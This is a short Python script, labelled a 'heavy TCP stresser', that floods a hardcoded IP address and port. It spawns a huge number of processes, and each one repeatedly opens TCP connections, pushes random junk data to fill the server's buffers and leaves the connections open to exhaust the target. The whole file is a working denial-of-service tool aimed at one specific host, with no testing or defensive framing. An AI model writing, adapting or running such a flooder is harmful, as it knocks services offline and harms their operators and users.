#!/usr/bin/env python3
import socket
import multiprocessing
import os
import sys

# --- TARGET CONFIG ---
IP = "37.230.54.220"
PORT = 19015
PROCS = os.cpu_count() * 100000  # Maximize CPU power
DATA_SIZE = 64024 # Size of junk data to send after connecting

def tcp_flood():
    """Heavy TCP Connection/Data Engine"""
    while True:
        try:
            # Create TCP Socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Optimization: Disable Nagle's algorithm for faster sending
            sock.setsockopt(socket.getprotobyname('tcp'), socket.TCP_NODELAY, 1)
            sock.settimeout(1)
            
            # Connect to server
            sock.connect((IP, PORT))
            
            # After connecting, keep the connection 'busy' with junk data
            # This fills the server's receive buffer
            for _ in range(50):
                sock.send(os.urandom(DATA_SIZE))
            
            # Do NOT close immediately - holding it open is heavier
        except Exception:
            try:
                sock.close()
            except:
                pass

if __name__ == "__main__":
    print(f"--- HEAVY TCP STRESSER: {IP}:{PORT} ---")
    print(f"[*] Processes: {PROCS}")
    print("[*] Status: Flood active. Use Ctrl+C to stop.")

    jobs = []
    for _ in range(PROCS):
        p = multiprocessing.Process(target=tcp_flood)
        p.daemon = True
        p.start()
        jobs.append(p)

    try:
        for j in jobs: j.join()
    except KeyboardInterrupt:
        print("\n[!] Stopped.")
        sys.exit()
